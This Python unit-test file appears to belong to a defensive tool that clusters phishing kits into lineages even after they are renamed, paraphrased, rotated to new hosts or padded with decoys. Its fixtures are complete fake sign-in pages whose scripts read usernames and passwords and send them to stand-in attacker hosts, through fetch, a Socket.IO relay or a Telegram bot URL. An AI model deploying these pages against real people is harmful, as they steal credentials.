#!/usr/bin/env python3
"""Unit tests for mutation-resistant scam-kit lineage (relayshield_scamkit_lineage).

Pure functions only: no network, no AWS. The mutation fixtures are the
point of the suite — each is KIT_A after one class of AI-style mutation
(renaming, paraphrasing, infrastructure rotation, decoy insertion), and
each must stay in KIT_A's lineage while its exact kit_<sha256> changes.

Measured similarities against KIT_A (sklin-v1, this suite's fixtures):
  identical 1.000 · renamed 1.000 · paraphrased 1.000 · rotated 0.880 ·
  decoy-stuffed 0.797 · unrelated kits 0.16-0.40 · near-threshold 0.590.

Run:  python3 test_scamkit_lineage.py
"""

import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import relayshield_scamkit_lineage as lin

# The base module (skfp-v2) — used by the composition tests when present.
# Production layout: relayshield_scamkit.py sits beside this suite (the
# innovation build pointed at ../../relayshield instead).
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.abspath(_BASE_DIR))
try:
    import relayshield_scamkit as sk
    HAVE_SK = True
except Exception:
    sk = None
    HAVE_SK = False

PAGE_URL = "https://phish.example.com/login"

KIT_A = """<html><head><title>Sign in to your account</title>
<link rel="stylesheet" href="/assets/style.css">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<div class="wrap"><div class="card">
<h1>Account Verification</h1>
<p>Your account has been temporarily limited. Sign in to restore full access within 24 hours.</p>
<form action="https://collect.evil-cdn.example/next.php" method="post" id="loginForm">
<label>Username</label><input type="text" name="user" id="f_user" required>
<label>Password</label><input type="password" name="pass" id="f_pass" required>
<input type="hidden" name="session" value="AAA111">
<button type="submit">Continue</button>
</form>
<p class="fine">Secure sign in protected by encryption.</p>
</div></div>
<script>
var appId = "72782ba9-4490-4f03-8d82-562370ea3566";
var socket = io("https://relay.evil-cdn.example");
socket.emit("new-session", {u: "x"});
socket.on("password_command", function(d){ document.getElementById("f_pass").focus(); });
var tries = 0;
function sendData(){
  var u = document.getElementById("f_user").value;
  var p = document.getElementById("f_pass").value;
  fetch("https://collect.evil-cdn.example/next.php", {method: "POST", body: JSON.stringify({u: u, p: p})});
  if (tries > 2) { window.location = "https://www.microsoft.com"; }
  tries++;
}
document.getElementById("loginForm").addEventListener("submit", function(e){ e.preventDefault(); sendData(); });
for (var i = 0; i < 3; i++) { console.log(i); }
localStorage.setItem("seen", "1");
</script>
</body></html>"""

# Mutation 1: renamed identifiers, field names, ids/classes, title.
MUT_RENAMED = """<html><head><title>Microsoft account | Sign in</title>
<link rel="stylesheet" href="/static/theme-2024.css">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<div class="shell"><div class="panel">
<h1>Account Verification</h1>
<p>Your account has been temporarily limited. Sign in to restore full access within 24 hours.</p>
<form action="https://collect.evil-cdn.example/next.php" method="post" id="authForm">
<label>Username</label><input type="text" name="login_id" id="fld_a" required>
<label>Password</label><input type="password" name="pwd" id="fld_b" required>
<input type="hidden" name="ref" value="ZZZ999">
<button type="submit">Continue</button>
</form>
<p class="note">Secure sign in protected by encryption.</p>
</div></div>
<script>
var appId = "72782ba9-4490-4f03-8d82-562370ea3566";
var relay = io("https://relay.evil-cdn.example");
relay.emit("new-session", {u: "x"});
relay.on("password_command", function(d){ document.getElementById("fld_b").focus(); });
var attempts = 0;
function transmit(){
  var a = document.getElementById("fld_a").value;
  var b = document.getElementById("fld_b").value;
  fetch("https://collect.evil-cdn.example/next.php", {method: "POST", body: JSON.stringify({u: a, p: b})});
  if (attempts > 2) { window.location = "https://www.microsoft.com"; }
  attempts++;
}
document.getElementById("authForm").addEventListener("submit", function(e){ e.preventDefault(); transmit(); });
for (var j = 0; j < 3; j++) { console.log(j); }
localStorage.setItem("visited", "yes");
</script>
</body></html>"""

# Mutation 2: paraphrased visible text + reworded script strings, extra comments.
MUT_PARAPHRASED = """<html><head><title>Verify your identity</title>
<link rel="stylesheet" href="/assets/style.css">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<div class="wrap"><div class="card">
<h1>We need to confirm it is really you</h1>
<p>We noticed unusual activity, so access is restricted for now. Please log in again so we can lift the restriction before the end of the day.</p>
<form action="https://collect.evil-cdn.example/next.php" method="post" id="loginForm">
<label>Enter your email or phone</label><input type="text" name="user" id="f_user" required>
<label>Enter your password</label><input type="password" name="pass" id="f_pass" required>
<input type="hidden" name="session" value="QWE222">
<button type="submit">Next</button>
</form>
<p class="fine">This connection is encrypted end to end for your protection.</p>
</div></div>
<script>
// session bootstrap
var appId = "72782ba9-4490-4f03-8d82-562370ea3566";
var socket = io("https://relay.evil-cdn.example");
socket.emit("new-session", {u: "x"});
socket.on("password_command", function(d){ document.getElementById("f_pass").focus(); });
var tries = 0;
function sendData(){
  var u = document.getElementById("f_user").value;
  var p = document.getElementById("f_pass").value;
  fetch("https://collect.evil-cdn.example/next.php", {method: "POST", body: JSON.stringify({u: u, p: p})});
  if (tries > 2) { window.location = "https://www.microsoft.com"; }
  tries++;
}
document.getElementById("loginForm").addEventListener("submit", function(e){ e.preventDefault(); sendData(); });
for (var i = 0; i < 3; i++) { console.log("tick " + i); }
localStorage.setItem("seen", "1");
</script>
</body></html>"""

# Mutation 3: rotated exfil infrastructure (hosts, panel path, app id, nonce).
MUT_ROTATED = """<html><head><title>Sign in to your account</title>
<link rel="stylesheet" href="/assets/style.css">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<div class="wrap"><div class="card">
<h1>Account Verification</h1>
<p>Your account has been temporarily limited. Sign in to restore full access within 24 hours.</p>
<form action="https://drop.fresh-host.example.net/gate.php" method="post" id="loginForm">
<label>Username</label><input type="text" name="user" id="f_user" required>
<label>Password</label><input type="password" name="pass" id="f_pass" required>
<input type="hidden" name="session" value="RTY777">
<button type="submit">Continue</button>
</form>
<p class="fine">Secure sign in protected by encryption.</p>
</div></div>
<script>
var appId = "11112222-3333-4444-5555-666677778888";
var socket = io("https://node42.other-relay.example.org");
socket.emit("new-session", {u: "x"});
socket.on("password_command", function(d){ document.getElementById("f_pass").focus(); });
var tries = 0;
function sendData(){
  var u = document.getElementById("f_user").value;
  var p = document.getElementById("f_pass").value;
  fetch("https://drop.fresh-host.example.net/gate.php", {method: "POST", body: JSON.stringify({u: u, p: p})});
  if (tries > 2) { window.location = "https://www.microsoft.com"; }
  tries++;
}
document.getElementById("loginForm").addEventListener("submit", function(e){ e.preventDefault(); sendData(); });
for (var i = 0; i < 3; i++) { console.log(i); }
localStorage.setItem("seen", "1");
</script>
</body></html>"""

# Mutation 4: decoy nodes, wrapper chains, decoy form + decoy script.
MUT_DECOY = """<html><head><title>Sign in to your account</title>
<link rel="stylesheet" href="/assets/style.css">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<div><div><section>
<div class="wrap"><div class="card">
<span></span><span></span><b></b><i></i><em></em><u></u><font></font><div></div><p></p>
<h1>Account Verification</h1>
<p>Your account has been temporarily limited. Sign in to restore full access within 24 hours.</p>
<div><div>
<form action="https://collect.evil-cdn.example/next.php" method="post" id="loginForm">
<label>Username</label><input type="text" name="user" id="f_user" required>
<label>Password</label><input type="password" name="pass" id="f_pass" required>
<input type="hidden" name="session" value="AAA111">
<button type="submit">Continue</button>
</form>
</div></div>
<p class="fine">Secure sign in protected by encryption.</p>
<form action="/newsletter" method="get"><input type="email" name="nl_email"><button type="submit">Subscribe</button></form>
</div></div>
</section></div></div>
<script>var decoy = 0; while (decoy < 2) { decoy++; } console.log("loading");</script>
<script>
var appId = "72782ba9-4490-4f03-8d82-562370ea3566";
var socket = io("https://relay.evil-cdn.example");
socket.emit("new-session", {u: "x"});
socket.on("password_command", function(d){ document.getElementById("f_pass").focus(); });
var tries = 0;
function sendData(){
  var u = document.getElementById("f_user").value;
  var p = document.getElementById("f_pass").value;
  fetch("https://collect.evil-cdn.example/next.php", {method: "POST", body: JSON.stringify({u: u, p: p})});
  if (tries > 2) { window.location = "https://www.microsoft.com"; }
  tries++;
}
document.getElementById("loginForm").addEventListener("submit", function(e){ e.preventDefault(); sendData(); });
for (var i = 0; i < 3; i++) { console.log(i); }
localStorage.setItem("seen", "1");
</script>
</body></html>"""

KIT_B = """<html><head><title>Secure Bank</title></head><body>
<div class="login"><form action="https://other-bad.example.org/in" method="post">
<input type="email" name="email"></form></div>
<script>console.log("hello");</script>
</body></html>"""

KIT_CARD = """<html><head><title>Payment Verification</title></head><body>
<table><tr><td>
<h2>Confirm your card</h2>
<form action="/process.php" method="post">
<input type="text" name="ccnum"><input type="text" name="exp">
<select name="month"><option>01</option></select>
<select name="year"><option>2026</option></select>
<input type="text" name="cvv"><input type="submit" value="Verify">
</form>
</td></tr></table>
</body></html>"""

KIT_NEAR = """<html><head><title>Sign in</title></head><body>
<table><tr><td>
<p>Please sign in to continue.</p>
<form action="https://secure-login.example.com/auth" method="post">
<input type="text" name="username"><input type="password" name="password">
<input type="submit" value="Sign in">
</form>
</td></tr></table>
<script>
function go(){
  var f = document.querySelector("form");
  f.addEventListener("submit", function(e){
    var d = new FormData(f);
    fetch("https://secure-login.example.com/auth", {method: "POST", body: JSON.stringify({ok: 1})});
  });
}
go();
</script>
</body></html>"""

PAGES = {"A": KIT_A, "RENAMED": MUT_RENAMED, "PARAPHRASED": MUT_PARAPHRASED,
         "ROTATED": MUT_ROTATED, "DECOY": MUT_DECOY, "B": KIT_B,
         "CARD": KIT_CARD, "NEAR": KIT_NEAR}


# Same public scaffold as A, different operator: same harvest form and
# DOM outline, generic hardcoded UA strings, but no Socket.IO relay, no
# hardcoded App ID, a different panel path, and a Telegram-style bot exfil.
KIT_NEAR2 = """<html><head><title>Verify your identity</title></head><body>
<div class="wrap"><div class="card">
<h1>Identity check</h1>
<p>We noticed unusual activity. Confirm your credentials to continue using your account.</p>
<form action="https://secure-login.example.net/process.php" method="post" id="loginForm">
<label>Username</label><input type="text" name="user" id="f_user" required>
<label>Password</label><input type="password" name="pass" id="f_pass" required>
<input type="hidden" name="session" value="AAA111">
<button type="submit">Continue</button>
</form>
<p class="fine">Protected by encryption.</p>
</div></div>
<script>
var ua1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
var ua2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)";
var tries = 0;
function sendData(){
  var u = document.getElementById("f_user").value;
  var p = document.getElementById("f_pass").value;
  fetch("https://api.telegram.org/bot123456:ABC/sendMessage", {method: "POST", body: JSON.stringify({u: u, p: p})});
  tries++;
}
document.getElementById("loginForm").addEventListener("submit", function(e){ e.preventDefault(); sendData(); });
</script>
</body></html>"""


def feats(html, url=PAGE_URL, signals=None):
    return lin.extract_structural_features(html, url, signals)


def registry_for(*htmls):
    """Founding registry: one lineage per html, in order."""
    out = []
    for h in htmls:
        f = feats(h)
        out.append({"lineage_id": lin.lineage_id_for(f), "features": f})
    return out


class TestExtractionInvariants(unittest.TestCase):
    def test_deterministic(self):
        f1, f2 = feats(KIT_A), feats(KIT_A)
        self.assertEqual(f1, f2)
        self.assertEqual(json.dumps(f1, sort_keys=True),
                         json.dumps(f2, sort_keys=True))

    def test_feature_shape(self):
        f = feats(KIT_A)
        self.assertEqual(set(f), {"lineage_version", "dom", "forms",
                                  "scripts", "infra", "marks"})
        self.assertEqual(f["lineage_version"], "sklin-v1")
        self.assertIn("post:text/password/hidden/button:external",
                      f["forms"]["signatures"])
        self.assertIn("rockstar-flowerstorm-appid", f["marks"]["appid"])
        self.assertIn("rockstar-flowerstorm-next-php", f["marks"]["uri"])
        self.assertIn("socketio", f["scripts"]["api"])
        self.assertIn("evt:new-session", f["scripts"]["events"])

    def test_raw_values_never_in_features(self):
        dumped = str(feats(KIT_A))
        # Hosts appear only as roles/shapes; App IDs only as marker names.
        self.assertNotIn("evil-cdn.example", dumped)
        self.assertNotIn("cdn.socket.io", dumped)
        self.assertNotIn("72782ba9-4490-4f03-8d82-562370ea3566", dumped)
        # The victim nonce is nowhere.
        self.assertNotIn("AAA111", dumped)

    def test_secrets_never_in_features(self):
        html = ("<html><body><script>"
                "var k='AKIAIOSFODNN7EXAMPLE'; var p='hunter2-hunter2';"
                "var e='victim@target.com';"
                "var w='0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe';"
                "</script></body></html>")
        dumped = str(feats(html))
        for secret in ("AKIAIOSFODNN7EXAMPLE", "hunter2",
                       "victim@target.com",
                       "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe"):
            self.assertNotIn(secret, dumped)
        # ...but the wallet's SHAPE is a feature (presence token only).
        self.assertIn("has:wallet-eth", dumped)

    def test_strip_secrets_idempotent(self):
        once = lin.strip_secrets(KIT_A)
        self.assertEqual(once, lin.strip_secrets(once))

    def test_empty_and_trivial_input(self):
        for html in ("", "<html></html>", "not html at all"):
            f = feats(html)
            self.assertEqual(f["forms"]["count"], 0)
            res = lin.assign_lineage(f, registry_for(KIT_A))
            self.assertNotEqual(res["decision"], "matched")


class TestCaps(unittest.TestCase):
    def test_fields_per_form_capped_at_25(self):
        fields = "".join(f'<input type="text" name="f{i}">' for i in range(40))
        html = f'<html><body><form method="post">{fields}</form></body></html>'
        sig = feats(html)["forms"]["signatures"][0]
        self.assertEqual(len(sig.split(":")[1].split("/")), 25)

    def test_events_capped(self):
        emits = "".join(f'socket.emit("event-{i}", {{}});' for i in range(30))
        html = ('<html><head><script src="https://cdn.socket.io/4.7.2/socket.io.min.js">'
                f'</script></head><body><script>var s = io("https://r.example");'
                f'{emits}</script></body></html>')
        events = feats(html)["scripts"]["events"]
        self.assertLessEqual(len(events), lin.MAX_EVENT_TOKENS)


class TestMutationClustering(unittest.TestCase):
    """The core claim: mutations stay in the lineage."""

    @classmethod
    def setUpClass(cls):
        cls.base = feats(KIT_A)
        cls.registry = [{"lineage_id": lin.lineage_id_for(cls.base),
                         "features": cls.base}]

    def _assert_matched(self, html, floor):
        f = feats(html)
        score, _ = lin.structural_similarity(f, self.base)
        self.assertGreaterEqual(score, floor)
        res = lin.assign_lineage(f, self.registry)
        self.assertEqual(res["decision"], "matched")
        self.assertEqual(res["lineage_id"], self.registry[0]["lineage_id"])
        self.assertGreaterEqual(res["confidence"], 0.75)
        return res

    def test_identical_kit_matches(self):
        self._assert_matched(KIT_A, 0.99)

    def test_renamed_files_and_identifiers_match(self):
        # Renamed assets, input names, element ids/classes, JS identifiers.
        self._assert_matched(MUT_RENAMED, 0.95)

    def test_paraphrased_text_matches(self):
        # Every visible string rewritten; script strings reworded.
        self._assert_matched(MUT_PARAPHRASED, 0.95)

    def test_rotated_infrastructure_matches(self):
        # New exfil/relay hosts, panel path renamed, attacker App ID
        # rotated: the kit-constant marks are gone and it STILL matches
        # on structure (measured 0.880).
        res = self._assert_matched(MUT_ROTATED, 0.80)
        self.assertLess(res["similarity"], 0.95)  # rotation costs score

    def test_decoy_stuffed_matches(self):
        # Wrapper chains, empty-tag stuffing, a decoy form, a decoy
        # script, filler content (measured 0.797).
        self._assert_matched(MUT_DECOY, 0.75)

    def test_mutations_match_each_other(self):
        # Lineage is not just "close to the founder": two different
        # mutations of the same kit cluster together.
        reg = registry_for(MUT_RENAMED)
        res = lin.assign_lineage(feats(MUT_DECOY), reg)
        self.assertEqual(res["decision"], "matched")


class TestUnrelatedKits(unittest.TestCase):
    def test_unrelated_kits_found_new_lineages(self):
        reg = registry_for(KIT_A)
        for html in (KIT_B, KIT_CARD, KIT_NEAR):
            res = lin.assign_lineage(feats(html), reg)
            self.assertEqual(res["decision"], "new")
            self.assertLess(res["similarity"], lin.SUGGEST_LINEAGE_THRESHOLD)
            self.assertTrue(lin.valid_lineage_id(res["lineage_id"]))

    def test_unrelated_kits_are_not_each_other(self):
        score, _ = lin.structural_similarity(feats(KIT_B), feats(KIT_CARD))
        self.assertLess(score, lin.SUGGEST_LINEAGE_THRESHOLD)


class TestNearThreshold(unittest.TestCase):
    """KIT_NEAR2: same public scaffold and harvest form as KIT_A, but a
    different operator's backend (Telegram bot exfil, no Socket.IO relay,
    no kit constants, different panel path). Measured similarity 0.590.

    EXPECTED BEHAVIOR: decision is "suggested", never "matched". The
    lineage_id is NOT assigned (None); the founder's lineage is named
    as a candidate for human review. This is the suggest_family rule —
    weak evidence suggests, it never merges — because a wrong merge
    poisons every later assignment against that lineage, while a missed
    merge costs one review-queue entry."""

    def test_near_threshold_is_suggested_not_merged(self):
        reg = registry_for(KIT_A)
        res = lin.assign_lineage(feats(KIT_NEAR2), reg)
        self.assertEqual(res["decision"], "suggested")
        self.assertIsNone(res["lineage_id"])
        self.assertEqual(res["candidate_lineage_id"], reg[0]["lineage_id"])
        self.assertGreaterEqual(res["similarity"], lin.SUGGEST_LINEAGE_THRESHOLD)
        self.assertLess(res["similarity"], lin.SAME_LINEAGE_THRESHOLD)
        self.assertGreaterEqual(res["confidence"], 0.45)
        self.assertLess(res["confidence"], 0.75)

    def test_near_threshold_founds_own_cluster_with_borderline_note(self):
        out = lin.cluster_lineages([feats(KIT_A), feats(KIT_NEAR2)])
        self.assertEqual(len(out["clusters"]), 2)
        self.assertEqual(len(out["borderline"]), 1)
        self.assertEqual(out["borderline"][0]["candidate_lineage_id"],
                         out["clusters"][0]["lineage_id"])


class TestRichnessGuard(unittest.TestCase):
    def test_sparse_pages_never_auto_assign(self):
        # Two near-empty pages with identical shape: similarity is 1.0
        # but there is almost no evidence. Exact identity is kit_'s job;
        # lineage must suggest, not assign.
        a = feats("<html><body><p>Sign in</p></body></html>",
                  "https://a.example/")
        b = feats("<html><body><div><p>Hello there</p></div></body></html>",
                  "https://b.example/")
        score, _ = lin.structural_similarity(a, b)
        self.assertGreaterEqual(score, lin.SAME_LINEAGE_THRESHOLD)
        self.assertLess(lin.feature_richness(a), lin.MIN_RICHNESS_TOKENS)
        res = lin.assign_lineage(
            b, [{"lineage_id": lin.lineage_id_for(a), "features": a}])
        self.assertEqual(res["decision"], "suggested")
        self.assertIn("sparse", res["reason"])


class TestLineageIds(unittest.TestCase):
    def test_id_shape_and_validation(self):
        lid = lin.lineage_id_for(feats(KIT_A))
        self.assertTrue(lid.startswith("lineage_"))
        self.assertTrue(lin.valid_lineage_id(lid))
        self.assertFalse(lin.valid_lineage_id("lineage_zzz"))
        self.assertFalse(lin.valid_lineage_id("kit_" + "a" * 64))
        self.assertFalse(lin.valid_lineage_id(""))

    def test_id_deterministic_and_sensitive(self):
        self.assertEqual(lin.lineage_id_for(feats(KIT_A)),
                         lin.lineage_id_for(feats(KIT_A)))
        self.assertNotEqual(lin.lineage_id_for(feats(KIT_A)),
                            lin.lineage_id_for(feats(KIT_B)))

    def test_assignment_returns_stored_id_not_recomputed(self):
        # A mutation's own would-be ID differs from the founder's; the
        # assignment must return the STORED (founder's) ID — stability
        # comes from the registry, not from recomputation.
        reg = registry_for(KIT_A)
        mut = feats(MUT_ROTATED)
        self.assertNotEqual(lin.lineage_id_for(mut), reg[0]["lineage_id"])
        res = lin.assign_lineage(mut, reg)
        self.assertEqual(res["lineage_id"], reg[0]["lineage_id"])


class TestConfidence(unittest.TestCase):
    def test_band_edges_mirror_house_bands(self):
        self.assertEqual(lin.lineage_confidence_band(0.90), "exact")
        self.assertEqual(lin.lineage_confidence_band(0.60), "likely_variant")
        self.assertEqual(lin.lineage_confidence_band(0.30), "weak")
        self.assertEqual(lin.lineage_confidence_band(0.29), "unknown")

    def test_new_lineage_confidence_grows_with_distance(self):
        reg = registry_for(KIT_A)
        near = lin.assign_lineage(feats(KIT_NEAR), reg)   # sim 0.40
        far = lin.assign_lineage(feats(KIT_B), reg)       # sim 0.16
        self.assertEqual(near["decision"], "new")
        self.assertEqual(far["decision"], "new")
        self.assertGreater(far["confidence"], near["confidence"])


class TestClustering(unittest.TestCase):
    def test_batch_clusters(self):
        batch = [feats(KIT_A), feats(MUT_RENAMED), feats(MUT_ROTATED),
                 feats(KIT_B), feats(KIT_CARD), feats(KIT_NEAR2)]
        out = lin.cluster_lineages(batch)
        self.assertEqual(len(out["clusters"]), 4)
        by_member = {}
        for c in out["clusters"]:
            for m in c["members"]:
                by_member[m] = c["lineage_id"]
        self.assertEqual(by_member[0], by_member[1])
        self.assertEqual(by_member[0], by_member[2])
        self.assertNotEqual(by_member[0], by_member[3])
        self.assertNotEqual(by_member[3], by_member[4])
        self.assertNotEqual(by_member[0], by_member[5])
        self.assertEqual(len(out["borderline"]), 1)

    def test_clustering_is_order_independent(self):
        names = [KIT_A, MUT_RENAMED, MUT_ROTATED, KIT_B, KIT_CARD]
        fwd = lin.cluster_lineages([feats(h) for h in names])
        rev = lin.cluster_lineages([feats(h) for h in reversed(names)])
        self.assertEqual(len(fwd["clusters"]), len(rev["clusters"]))
        self.assertEqual({c["lineage_id"] for c in fwd["clusters"]},
                         {c["lineage_id"] for c in rev["clusters"]})


@unittest.skipUnless(HAVE_SK, "relayshield_scamkit not importable")
class TestCompositionWithScamkit(unittest.TestCase):
    """The two layers side by side: where kit_<sha256> decays and where
    it does not, lineage holds either way."""

    def _kid(self, html):
        return sk.fingerprint_id(sk.extract_signals(html, PAGE_URL))

    def test_victim_rotation_keeps_kit_id_and_lineage(self):
        # The case exact fingerprinting already solves (nonce/credential
        # rotation): kit_ is stable, lineage agrees.
        victim = KIT_A.replace("AAA111", "ZZZ999")
        self.assertEqual(self._kid(KIT_A), self._kid(victim))
        reg = registry_for(KIT_A)
        res = lin.assign_lineage(feats(victim), reg)
        self.assertEqual(res["decision"], "matched")

    def test_paraphrase_breaks_kit_id_but_not_lineage(self):
        self.assertNotEqual(self._kid(KIT_A), self._kid(MUT_PARAPHRASED))
        reg = registry_for(KIT_A)
        res = lin.assign_lineage(feats(MUT_PARAPHRASED), reg)
        self.assertEqual(res["decision"], "matched")

    def test_infra_rotation_breaks_kit_id_but_not_lineage(self):
        self.assertNotEqual(self._kid(KIT_A), self._kid(MUT_ROTATED))
        reg = registry_for(KIT_A)
        res = lin.assign_lineage(feats(MUT_ROTATED), reg)
        self.assertEqual(res["decision"], "matched")

    def test_signals_path_marks_agree_with_builtin(self):
        signals = sk.extract_signals(KIT_A, PAGE_URL)
        f = feats(KIT_A, signals=signals)
        self.assertIn("rockstar-flowerstorm-appid", f["marks"]["appid"])
        self.assertIn("rockstar-flowerstorm-next-php", f["marks"]["uri"])
        self.assertEqual(f["marks"], feats(KIT_A)["marks"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
